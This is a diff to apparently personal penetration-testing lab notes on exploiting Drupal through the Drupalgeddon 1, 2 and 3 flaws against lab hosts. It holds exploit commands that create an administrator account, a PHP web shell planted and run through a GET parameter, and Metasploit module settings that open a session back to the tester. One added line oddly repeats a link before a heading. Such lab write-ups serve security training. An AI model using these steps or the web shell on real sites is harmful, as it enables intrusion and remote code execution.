@@ -1,4 +1,4 @@
-### Discovery
+[multiple versions](https://www.drupal.org/sa-core-2018-004)[multiple versions](https://www.drupal.org/sa-core-2018-004)### Discovery
 ```bash
 curl -s http://drupal.inlanefreight.local | grep Drupal
 
@@ -72,4 +72,51 @@ CVE-2018-7600, also known as Drupalgeddon2, is a remote code execution vulnerabi
 
 CVE-2018-7602, also known as Drupalgeddon3, is a remote code execution vulnerability that affects multiple versions of Drupal 7.x and 8.x. This flaw exploits improper validation in the Form API.
 Let's walk through exp
+```
+
+#### Drupalgeddon
+[PoC](https://www.exploit-db.com/exploits/34992)
+`python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd`
+Then getting a shell like the other ways now that we are administrator.
+
+#### Drupalgeddon v2
+[PoC v2](https://www.exploit-db.com/exploits/44448)
+```bash
+python3 drupalgeddon2.py
+Enter the url: url/shell.txt
+
+curl -s http://drupal-dev.inlanefreight.local/shell.txt
+```
+```php
+# Modifying the PHP
+<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>
+
+echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
+
+echo "Then base64 output" | base64 -d | tee mrb3n.php
+
+python3 drupalgeddon2.py
+Enter the url: http://drupal-dev.inlanefreight.local/
+Check: http://drupal-dev.inlanefreight.local/mrb3n.php
+
+curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
+```
+
+#### Drupalgeddon v3
+[Drupalgeddon3](https://github.com/rithchard/Drupalgeddon3)
+[Multiple Versions](https://www.drupal.org/sa-core-2018-004)
+![[Drupalgeddon-v3.png]]
+
+```bash
+msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195
+msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.inlanefreight.local   
+
+msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
+
+msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1
+msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST 10.10.14.15
+msf6 exploit(multi/http/drupal_drupageddon3) > show options 
+
+exploit
+sysinfo
 ```
